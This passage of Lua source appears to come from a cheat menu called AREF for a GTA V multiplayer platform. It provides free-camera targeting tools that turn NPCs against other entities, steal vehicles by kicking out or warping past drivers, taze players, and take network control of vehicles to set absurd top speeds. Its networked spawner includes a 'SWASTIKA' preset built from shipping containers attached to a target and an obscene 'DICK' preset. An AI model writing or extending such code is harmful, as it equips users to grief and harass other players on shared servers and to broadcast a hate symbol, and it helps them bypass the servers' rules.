                AREF:AddNotification("INFO", ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, dict.tostring(attacker)) .. " stealing " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, dict.tostring(victim)), 5000)
   
            end
   
        end
   
    
   
        local beginning_target
   
    
   
        function AREF.FreeCam:PedTarget(cam, x, y, z)
   
            local rightVec, forwardVec, upVec = AREF:GetFunction("GetCamMatrix")(cam)
   
            local curVec = vector3(x, y, z)
   
            local targetVec = curVec + forwardVec * 150
   
            local handle = AREF:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
   
            local _, _, endCoords, _, entity = AREF:GetFunction("GetShapeTestResult")(handle)
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE2"]) then
   
                beginning_target = nil
   
            end
   
    
   
            if not AREF:GetFunction("DoesEntityExist")(beginning_target) then
   
                beginning_target = nil
   
            else
   
                self:DrawBoundingBox(beginning_target, 0, 100, 0, 50)
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["R"]) then
   
                    AREF:GetFunction("ClearPedTasks")(beginning_target)
   
                    AREF:GetFunction("ClearPedSecondaryTask")(beginning_target)
   
                    AREF:AddNotification("SUCCESS", "Cleared tasks for " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, beginning_target))
   
                    beginning_target = nil
   
                end
   
            end
   
    
   
            if AREF:GetFunction("DoesEntityExist")(entity) and AREF:GetFunction("DoesEntityHaveDrawable")(entity) and not AREF:GetFunction("IsEntityAnObject")(entity) then
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and not beginning_target then
   
                    if AREF:GetFunction("IsEntityAVehicle")(entity) then
   
                        entity = AREF:GetFunction("GetPedInVehicleSeat")(entity, -1)
   
                    end
   
    
   
                    beginning_target = entity
   
                end
   
    
   
                if beginning_target ~= entity then
   
                    self:DrawBoundingBox(entity, 0, 122, 200, 50)
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and AREF:GetFunction("DoesEntityExist")(beginning_target) then
   
                        self:Attack(beginning_target, entity)
   
                        beginning_target = nil
   
                    end
   
                end
   
            end
   
        end
   
    
   
        local selected_spawner_opt = 1
   
        local selected_weapon_opt = 1
   
        local asking_weapon
   
        local selected_ped
   
        local selected_weapon
   
    
   
        AREF.FreeCam.SpawnerOptions = {
   
            ["PED"] = {"s_f_y_bartender_01", "a_m_y_beachvesp_01", "a_m_y_beach_03", "a_m_y_beach_02", "a_m_m_beach_02", "a_m_y_beach_01", "s_m_y_baywatch_01", "mp_f_boatstaff_01", "u_m_m_bikehire_01", "a_f_y_bevhills_04", "s_m_m_bouncer_01", "s_m_y_armymech_01", "s_m_y_autopsy_01", "s_m_y_blackops_01", "s_m_y_blackops_02"},
   
            ["WEAPONS"] = all_weapons,
   
            ["OBJECT"] = {"dt1_05_damage_slod", "dt1_05_build1_damage_lod", "ela_wdn_02lod_", "ela_wdn_04lod_", "apa_mp_apa_crashed_usaf_01a", "apa_mp_apa_yacht", "cloudhat_altostatus_a", "cloudhat_altitude_vlight_a", "cloudhat_cirrocumulus_a", "ch_prop_stunt_landing_zone_01a", "p_spinning_anus_s", "prop_gas_pump_1a", "prop_gas_pump_1b", "prop_gas_pump_1c", "prop_gas_pump_1d", "cargobob", "jet", "valor", "prop_med_jet_01", "xm_prop_base_jet_01", "xm_prop_base_jet_02", "prop_mp_spike_01", "prop_tyre_spike_01", "prop_container_ld2", "lts_prop_lts_ramp_03", "prop_jetski_ramp_01", "prop_mp_ramp_03_tu", "prop_skate_flatramp_cr", "stt_prop_ramp_adj_loop", "stt_prop_ramp_multi_loop_rb", "stt_prop_ramp_spiral_l", "stt_prop_ramp_spiral_l_m", "prop_const_fence03b_cr", "prop_const_fence02b", "prop_const_fence03a_cr", "prop_fnc_farm_01e", "prop_fnccorgm_02c", "ch3_01_dino", "p_pallet_02a_s", "prop_conc_blocks01a", "hei_prop_cash_crate_half_full", "prop_consign_01a", "prop_byard_net02", "prop_mb_cargo_04b", "prop_mb_crate_01a_set", "prop_pipe_stack_01", "prop_roadcone01c", "prop_rub_cage01b", "prop_sign_road_01a", "prop_sign_road_03m", "prop_traffic_rail_2", "prop_traffic_rail_1a", "prop_traffic_03a", "prop_traffic_01d", "prop_skid_trolley_1", "hei_prop_yah_seat_03", "hei_prop_yah_table_03", "lts_prop_lts_elecbox_24", "lts_prop_lts_elecbox_24b", "p_airdancer_01_s", "p_amb_brolly_01", "p_amb_brolly_01_s", "p_dumpster_t", "p_ld_coffee_vend_01", "p_patio_lounger1_s", "p_yacht_sofa_01_s", "prop_air_bagloader2_cr", "prop_air_bigradar", "prop_air_blastfence_01", "prop_air_stair_01", "prop_air_sechut_01", "prop_airport_sale_sign"},
   
            ["BULLET"] = {"WEAPON_STUNGUN", "WEAPON_RPG", "WEAPON_RAILGUN", "WEAPON_PISTOL", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_FIREWORK", "WEAPON_SNIPERRIFLE", "WEAPON_RAYPISTOL"},
   
            ["VEHICLE"] = car_spam,
   
            ["PREMADE"] = {
   
                ["SWASTIKA"] = function(ent, offZ)
   
                    if AREF.Config.SafeMode then return AREF:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
                    CreateThread(function()
   
                        local where = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
   
    
   
                        if not AREF:GetFunction("IsEntityAPed")(ent) then
   
                            where = vector3(where.x, where.y, where.z + 5.0)
   
                        end
   
    
   
                        if offZ then
   
                            where = vector3(where.x, where.y, where.z + offZ)
   
                        end
   
    
   
                        local column = {
   
                            ["up"] = {},
   
                            ["across"] = {}
   
                        }
   
    
   
                        for i = 0, 7 do
   
                            column["up"][i + 1] = {
   
                                x = 0.0,
   
                                y = 0.0,
   
                                z = 1.0 + (2.6 * (i + 1)),
   
                                _p = 90.0,
   
                                _y = 0.0,
   
                                _r = 0.0
   
                            }
   
                        end
   
    
   
                        for i = 0, 8 do
   
                            column["across"][i + 1] = {
   
                                x = 10.4 + (-2.6 * i),
   
                                y = 0.0,
   
                                z = 11.6,
   
                                _p = 90.0,
   
                                _y = 0.0,
   
                                _r = 0.0
   
                            }
   
                        end
   
    
   
                        local arms = {
   
                            ["bottom_right"] = {},
   
                            ["across_up"] = {},
   
                            ["top_left"] = {},
   
                            ["across_down"] = {}
   
                        }
   
    
   
                        for i = 0, 4 do
   
                            arms["bottom_right"][i] = {
   
                                x = -2.6 * i,
   
                                y = 0.0,
   
                                z = 1.0,
   
                                _p = 90.0,
   
                                _y = 0.0,
   
                                _r = 0.0
   
                            }
   
    
   
                            arms["top_left"][i] = {
   
                                x = 2.6 * i,
   
                                y = 0.0,
   
                                z = 22.2,
   
                                _p = 90.0,
   
                                _y = 0.0,
   
                                _r = 0.0
   
                            }
   
    
   
                            arms["across_down"][i + 1] = {
   
                                x = 10.4,
   
                                y = 0.0,
   
                                z = 12.6 - (2.25 * (i + 1)),
   
                                _p = 90.0,
   
                                _y = 0.0,
   
                                _r = 0.0
   
                            }
   
                        end
   
    
   
                        for i = 0, 3 do
   
                            arms["across_up"][i + 1] = {
   
                                x = -10.4,
   
                                y = 0.0,
   
                                z = 11.6 + (2.6 * (i + 1)),
   
                                _p = 90.0,
   
                                _y = 0.0,
   
                                _r = 0.0
   
                            }
   
                        end
   
    
   
                        local positions = {column["up"], column["across"], arms["bottom_right"], arms["across_up"], arms["top_left"], arms["across_down"]}
   
                        AREF:RequestModelSync("prop_container_05a")
   
    
   
                        for _, seg in dict.pairs(positions) do
   
                            for k, v in dict.pairs(seg) do
   
                                local obj = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")("prop_container_05a"), where.x, where.y, where.z + (offZ or 0), true, true, true)
   
                                AREF:DoNetwork(obj)
   
                                AREF:GetFunction("AttachEntityToEntity")(obj, ent, AREF:GetFunction("IsEntityAPed")(ent) and AREF:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p, v._y, v._r, false, true, false, false, 1, true)
   
                                Wait(80)
   
                            end
   
                        end
   
                    end)
   
                end,
   
                ["DICK"] = function(ent)
   
                    if AREF.Config.SafeMode then return AREF:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
                    CreateThread(function()
   
                        local where = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
   
    
   
                        if not AREF:GetFunction("IsEntityAPed")(ent) then
   
                            where = vector3(where.x, where.y, where.z + 5.0)
   
                        end
   
    
   
                        AREF:RequestModelSync("stt_prop_stunt_bowling_ball")
   
                        local ball_l = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
   
                        AREF:DoNetwork(ball_l)
   
                        AREF:GetFunction("AttachEntityToEntity")(ball_l, ent, AREF:GetFunction("IsEntityAPed")(ent) and AREF:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)
   
                        Wait(50)
   
                        local ball_r = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
   
                        AREF:DoNetwork(ball_r)
   
                        AREF:GetFunction("AttachEntityToEntity")(ball_r, ent, AREF:GetFunction("IsEntityAPed")(ent) and AREF:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)
   
                        Wait(50)
   
                        local shaft = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")("prop_container_ld2"), where.x, where.y, where.z, true, true, true)
   
                        AREF:DoNetwork(shaft)
   
                        AREF:GetFunction("AttachEntityToEntity")(shaft, ent, AREF:GetFunction("IsEntityAPed")(ent) and AREF:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)
   
                        Wait(50)
   
                    end)
   
                end
   
            }
   
        }
   
    
   
        local preview_object
   
        local preview_object_model
   
        local premade_options = {}
   
        local funcs = {}
   
    
   
        for name, func in dict.pairs(AREF.FreeCam.SpawnerOptions["PREMADE"]) do
   
            premade_options[#premade_options + 1] = name
   
            funcs[#funcs + 1] = func
   
        end
   
    
   
        function AREF.FreeCam:DeletePreview()
   
            if preview_object and AREF:GetFunction("DoesEntityExist")(preview_object) then
   
                AREF.Util:DeleteEntity(preview_object)
   
                preview_object = nil
   
            end
   
    
   
            preview_object = nil
   
            preview_object_model = nil
   
        end
   
    
   
        local bad_models = {}
   
        local _loading
   
        local doing_alpha
   
        local last_alpha
   
        local cur_notifs
   
    
   
        function AREF.FreeCam:Spawner(where, heading, type)
   
            local name, options
   
            local cam_rot = AREF:GetFunction("GetCamRot")(self.Cam, 0)
   
            if self.DraggingEntity and AREF:GetFunction("DoesEntityExist")(self.DraggingEntity) then return self:DeletePreview() end
   
    
   
            if type == "PED" then
   
                options = self.SpawnerOptions["PED"]
   
    
   
                if selected_spawner_opt > #options then
   
                    selected_spawner_opt = 1
   
                end
   
    
   
                if preview_object then
   
                    self:DeletePreview()
   
                end
   
    
   
                name = "Ped List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
   
                AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTCTRL"], 0), "Invisible"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTSHIFT"], 0), "God Mode"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["E"], 0), "Clone"}})
   
            elseif type == "BULLET" then
   
                AREF:SetIbuttons({{"b_117", "Change Mode"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["ENTER"], 0), "Shoot Bullet"}})
   
                options = self.SpawnerOptions["BULLET"]
   
    
   
                if selected_spawner_opt > #options then
   
                    selected_spawner_opt = 1
   
                end
   
    
   
                name = "Bullet List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
   
            elseif type == "OBJECT" then
   
                asking_weapon = false
   
                selected_weapon_opt = 1
   
                options = self.SpawnerOptions["OBJECT"]
   
    
   
                if selected_spawner_opt > #options then
   
                    selected_spawner_opt = 1
   
                end
   
    
   
                local cur_model = options[selected_spawner_opt]
   
    
   
                if preview_object_model ~= cur_model and not _loading then
   
                    _loading = true
   
    
   
                    CreateThread(function()
   
                        if not AREF:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then
   
                            _loading = false
   
                            self:DeletePreview()
   
                            bad_models[cur_model] = true
   
    
   
                            return AREF:AddNotification("ERROR", "Failed to load model ~r~" .. cur_model, 5000)
   
                        end
   
    
   
                        if bad_models[cur_model] then
   
                            _loading = false
   
                            self:DeletePreview()
   
    
   
                            return
   
                        end
   
    
   
                        if AREF:GetFunction("HasModelLoaded")(cur_model) then
   
                            _loading = false
   
                            self:DeletePreview()
   
                            preview_object = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z + 0.5, false, true, true)
   
                            AREF:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5, false, false, false, false)
   
                            AREF:GetFunction("SetEntityAlpha")(preview_object, 100)
   
                            AREF:GetFunction("FreezeEntityPosition")(preview_object, true)
   
                            AREF:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
   
                            AREF:GetFunction("SetEntityCollision")(preview_object, false, false)
   
                            preview_object_model = cur_model
   
                        end
   
                    end)
   
                end
   
    
   
                if preview_object and AREF:GetFunction("DoesEntityExist")(preview_object) then
   
                    AREF:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5, false, false, false, false)
   
                    AREF:GetFunction("SetEntityAlpha")(preview_object, 100)
   
                    AREF:GetFunction("FreezeEntityPosition")(preview_object, true)
   
                    AREF:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
   
                    AREF:GetFunction("SetEntityCollision")(preview_object, false, false)
   
                end
   
    
   
                name = "Object List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
   
                AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTCTRL"], 0), "Attach (Hovered)"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["E"], 0), "Clone"}})
   
            elseif type == "PREMADE" then
   
                asking_weapon = false
   
                selected_weapon_opt = 1
   
                options = premade_options
   
    
   
                if selected_spawner_opt > #options then
   
                    selected_spawner_opt = 1
   
                end
   
    
   
                if preview_object then
   
                    self:DeletePreview()
   
                end
   
    
   
                name = "Premade List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
   
            elseif type == "VEHICLE" then
   
                asking_weapon = false
   
                selected_weapon_opt = 1
   
                options = self.SpawnerOptions["VEHICLE"]
   
    
   
                if selected_spawner_opt > #options then
   
                    selected_spawner_opt = 1
   
                end
   
    
   
                local cur_model = options[selected_spawner_opt]
   
    
   
                if preview_object_model ~= cur_model and not _loading then
   
                    if preview_object then
   
                        self:DeletePreview()
   
                    end
   
    
   
                    _loading = true
   
    
   
                    CreateThread(function()
   
                        if not AREF:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then
   
                            _loading = false
   
                            self:DeletePreview()
   
                            bad_models[cur_model] = true
   
    
   
                            return AREF:AddNotification("ERROR", "Failed to load model ~r~" .. cur_model, 5000)
   
                        end
   
    
   
                        if bad_models[cur_model] then
   
                            _loading = false
   
                            self:DeletePreview()
   
    
   
                            return
   
                        end
   
    
   
                        if AREF:GetFunction("HasModelLoaded")(cur_model) then
   
                            _loading = false
   
                            self:DeletePreview()
   
                            preview_object = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z, false, true, true)
   
                            AREF:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + AREF:GetModelHeight(preview_object), false, false, false, false)
   
                            AREF:GetFunction("SetEntityAlpha")(preview_object, 100)
   
                            AREF:GetFunction("FreezeEntityPosition")(preview_object, true)
   
                            AREF:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
   
                            AREF:GetFunction("SetEntityCollision")(preview_object, false, false)
   
                            preview_object_model = cur_model
   
                        end
   
                    end)
   
                end
   
    
   
                if preview_object and AREF:GetFunction("DoesEntityExist")(preview_object) then
   
                    AREF:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + AREF:GetModelHeight(preview_object), false, false, false, false)
   
                    AREF:GetFunction("SetEntityAlpha")(preview_object, 100)
   
                    AREF:GetFunction("FreezeEntityPosition")(preview_object, true)
   
                    AREF:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
   
                    AREF:GetFunction("SetEntityCollision")(preview_object, false, false)
   
                end
   
    
   
                name = "Vehicle List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
   
            end
   
    
   
            if asking_weapon then
   
                options = self.SpawnerOptions["WEAPONS"]
   
                name = "Weapon List (" .. selected_weapon_opt .. "/" .. #options .. ")"
   
            end
   
    
   
            AREF.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF.Name) .. "] " .. (name or "?"), 4, false, AREF:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
   
            local sY = 30
   
            local max_opts = 30
   
            local cur_opt = (asking_weapon and selected_weapon_opt or selected_spawner_opt)
   
            local count = 0
   
            local total_opts = (#options or {})
   
            local can_see = true
   
    
   
            for id, val in dict.pairs(options or {}) do
   
                if total_opts > max_opts then
   
                    can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
   
                else
   
                    count = 0
   
                end
   
    
   
                if can_see and count <= 10 then
   
                    local r, g, b = 255, 255, 255
   
    
   
                    if (asking_weapon and selected_weapon_opt or selected_spawner_opt) == id then
   
                        r, g, b = AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3]
   
                    end
   
    
   
                    AREF.Painter:DrawText(val, 4, false, AREF:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
   
                    sY = sY + 20
   
                    count = count + 1
   
                end
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["DOWN"]) and not AREF.Showing then
   
                if asking_weapon then
   
                    local new = selected_weapon_opt + 1
   
    
   
                    if options[new] then
   
                        selected_weapon_opt = new
   
                    else
   
                        selected_weapon_opt = 1
   
                    end
   
                else
   
                    local new = selected_spawner_opt + 1
   
    
   
                    if options[new] then
   
                        selected_spawner_opt = new
   
                    else
   
                        selected_spawner_opt = 1
   
                    end
   
                end
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["UP"]) and not AREF.Showing then
   
                if asking_weapon then
   
                    local new = selected_weapon_opt - 1
   
    
   
                    if options[new] then
   
                        selected_weapon_opt = new
   
                    else
   
                        selected_weapon_opt = #options
   
                    end
   
                else
   
                    local new = selected_spawner_opt - 1
   
    
   
                    if options[new] then
   
                        selected_spawner_opt = new
   
                    else
   
                        selected_spawner_opt = #options
   
                    end
   
                end
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["ENTER"]) and not AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and not AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["SPACE"]) and not AREF.Showing then
   
                if type == "PED" then
   
                    if not asking_weapon then
   
                        selected_ped = options[selected_spawner_opt]
   
                        asking_weapon = true
   
                    else
   
                        selected_weapon = options[selected_weapon_opt]
   
                        local ped = AREF:SpawnPed(where, heading, selected_ped, selected_weapon)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            SetEntityInvincible(ped, true)
   
                        end
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTCTRL"]) then
   
                            AREF:GetFunction("SetEntityVisible")(ped, false)
   
                        end
   
    
   
                        AREF:AddNotification("SUCCESS", "Spawned ped.", 5000)
   
                    end
   
                elseif type == "OBJECT" then
   
                    local object = options[selected_spawner_opt]
   
                    AREF:RequestModelSync(object)
   
                    local obj = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)
   
                    AREF:DoNetwork(obj)
   
                    AREF:GetFunction("SetEntityRotation")(obj, 0.0, 0.0, cam_rot.z + 0.0)
   
    
   
                    if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTCTRL"]) and AREF:GetFunction("DoesEntityExist")(self.HoveredEntity) then
   
                        AREF:GetFunction("AttachEntityToEntity")(obj, self.HoveredEntity, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
   
                    end
   
    
   
                    Wait(50)
   
                elseif type == "PREMADE" then
   
                    local func = funcs[selected_spawner_opt]
   
                    func(self.HoveredEntity)
   
                elseif type == "VEHICLE" then
   
                    local model = options[selected_spawner_opt]
   
                    AREF:RequestModelSync(model)
   
                    local veh = AREF:GetFunction("CreateVehicle")(AREF:GetFunction("GetHashKey")(model), where.x, where.y, where.z + AREF:GetModelHeight(preview_object), 0.0, true, true)
   
                    AREF:DoNetwork(veh)
   
                    AREF:GetFunction("SetEntityRotation")(veh, 0.0, 0.0, cam_rot.z + 0.0)
   
                elseif type == "BULLET" then
   
                    local weapon = options[selected_spawner_opt]
   
                    AREF:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, where.x, where.y, where.z, 1.0, true, AREF:GetFunction("GetHashKey")(weapon), AREF.LocalPlayer, true, false, 100.0)
   
                end
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["BACKSPACE"]) and not AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE2"]) and asking_weapon and not AREF.Showing then
   
                asking_weapon = false
   
                selected_weapon_opt = 1
   
            end
   
    
   
            AREF.Painter:DrawRect(AREF:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
   
            AREF.Painter:DrawRect(AREF:ScrW() - 360 - 21 - offX, 49, 360, 2, AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3], 255)
   
        end
   
    
   
        local rotP, rotY, rotR
   
        local dist = {0, 45, 90, 135, 180, -45, -90, -135, -180}
   
        local smallest, index = dict.math.huge, 0
   
    
   
        local function _snap(rot)
   
            for _, val in dict.pairs(dist) do
   
                local diff = dict.math.abs(val - rot)
   
    
   
                if diff <= smallest then
   
                    smallest = diff
   
                    index = _
   
                end
   
            end
   
    
   
            return dist[index] or rot
   
        end
   
    
   
        function AREF:KickOutAllPassengers(ent, specific)
   
            for i = -1, AREF:GetFunction("GetVehicleMaxNumberOfPassengers")(ent) - 1 do
   
                if not AREF:GetFunction("IsVehicleSeatFree")(ent, i) and (not specific or specific == i) then
   
                    AREF:GetFunction("ClearPedTasks")(AREF:GetFunction("GetPedInVehicleSeat")(ent, i))
   
                    AREF:GetFunction("ClearPedSecondaryTask")(AREF:GetFunction("GetPedInVehicleSeat")(ent, i))
   
                    AREF:GetFunction("ClearPedTasksImmediately")(AREF:GetFunction("GetPedInVehicleSeat")(ent, i))
   
                end
   
            end
   
        end
   
    
   
        local _stealing
   
        local _stealing_ped
   
    
   
        function AREF.FreeCam:DoSteal(ent)
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTSHIFT"], 0), "Invisible"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTALT"], 0), "Fuck Up Speed"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["R"], 0), "Kick Out Driver"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE2"], 0), "Steal (NPC)"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Steal (Self)"}, {"b_117", "Change Mode"}})
   
            if not self:CheckType(ent, "VEHICLE") then return end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE2"]) then
   
                CreateThread(function()
   
                    _stealing = ent
   
                    local model = AREF.FreeCam.SpawnerOptions.PED[dict.math.random(1, #AREF.FreeCam.SpawnerOptions.PED)]
   
    
   
                    if not AREF:RequestModelSync(model) then
   
                        _stealing = nil
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                    end
   
    
   
                    local c = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
   
                    local x, y, z = c.x, c.y, c.z
   
                    local out, pos = AREF:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)
   
    
   
                    if not out then
   
                        pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, dict.math.random(-6, 6) + 0.0, dict.math.random(-6, 6) + 0.0, 0.0)
   
                    end
   
    
   
                    local random_npc = AREF:GetFunction("CreatePed")(24, AREF:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
   
                    _stealing_ped = random_npc
   
    
   
                    if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                        AREF:GetFunction("SetEntityVisible")(random_npc, false)
   
                    end
   
    
   
                    AREF:GetFunction("SetPedAlertness")(random_npc, 0.0)
   
                    local success = AREF:StealVehicleThread(random_npc, _stealing)
   
                    AREF:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)
   
                    local timeout = 0
   
    
   
                    if not success then
   
                        _stealing = nil
   
                        _stealing_ped = nil
   
    
   
                        return
   
                    end
   
    
   
                    while AREF:GetFunction("DoesEntityExist")(_stealing) and AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not AREF:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
   
                        timeout = timeout + 10
   
                        Wait(100)
   
                    end
   
    
   
                    if AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
   
                        _stealing = nil
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                    end
   
    
   
                    _stealing_ped = nil
   
                    _stealing = nil
   
                end)
   
            elseif AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) then
   
                CreateThread(function()
   
                    if AREF.Config.SafeMode then
   
                        AREF:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    else
   
                        AREF:KickOutAllPassengers(ent)
   
                        _stealing = ent
   
                        AREF:GetFunction("TaskWarpPedIntoVehicle")(AREF.LocalPlayer, ent, -1)
   
                        _stealing_ped = nil
   
                        _stealing = nil
   
                    end
   
                end)
   
            elseif AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["R"]) then
   
                if AREF.Config.SafeMode then
   
                    AREF:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    CreateThread(function()
   
                        _stealing = ent
   
                        local driver = AREF:GetFunction("GetPedInVehicleSeat")(ent, -1)
   
                        AREF:KickOutAllPassengers(ent, -1)
   
                        AREF:GetFunction("TaskWanderStandard")(driver)
   
                        _stealing_ped = nil
   
                        _stealing = nil
   
                    end)
   
                end
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["LEFTALT"]) then
   
                CreateThread(function()
   
                    AREF:GetFunction("NetworkRequestControlOfEntity")(ent)
   
    
   
                    if AREF:GetFunction("NetworkHasControlOfEntity")(ent) then
   
                        AREF:GetFunction("ModifyVehicleTopSpeed")(ent, 250000.0)
   
    
   
                        return AREF:AddNotification("SUCCESS", "Speed fucked!")
   
                    end
   
                end)
   
            end
   
    
   
            self:DrawBoundingBox(ent, 122, 177, 220, 50)
   
            self:DrawInfoCard(ent)
   
        end
   
    
   
        function AREF.FreeCam:DoTaze(ent, endCoords)
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Taze"}, {"b_117", "Change Mode"}})
   
    
   
            if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                self:DrawBoundingBox(ent, 50, 122, 200, 50)
   
            end
   
    
   
            if IsDisabledControlJustPressed(0, AREF.Keys["MOUSE1"]) then
   
                if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                    AREF:TazePlayer(ent)
   
                else
   
                    AREF:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, endCoords.x, endCoords.y, endCoords.z, 1, true, AREF:GetFunction("GetHashKey")("WEAPON_STUNGUN"), AREF.LocalPlayer, true, false, 24000.0)
   
                end
   
            end
   
        end
   
    
   
        function AREF.FreeCam:DoHydrant(ent, endCoords)
   
